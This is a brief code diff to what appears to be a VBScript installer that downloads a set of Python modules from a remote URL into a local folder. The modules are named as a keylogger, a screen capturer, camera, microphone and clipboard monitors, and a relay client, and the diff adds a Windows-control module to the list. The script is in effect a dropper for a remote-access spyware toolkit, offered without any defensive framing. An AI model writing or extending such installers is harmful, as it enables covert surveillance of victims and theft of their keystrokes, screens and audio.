@@ -15,7 +15,7 @@ If Not fs.FolderExists(DIR & "\recordings") Then fs.CreateFolder DIR & "\recordi
 Dim files, f
 files = Array("app.py","keylogger.py","screencap.py","controller.py","server.py", _
               "recorder.py","camera.py","clipboard_monitor.py","processes.py", _
-              "relay_client.py","file_manager.py","microphone.py","requirements.txt")
+              "relay_client.py","file_manager.py","microphone.py","windows_control.py","requirements.txt")
 
 For Each f In files
     Download RAW & "/" & f, DIR & "\" & f
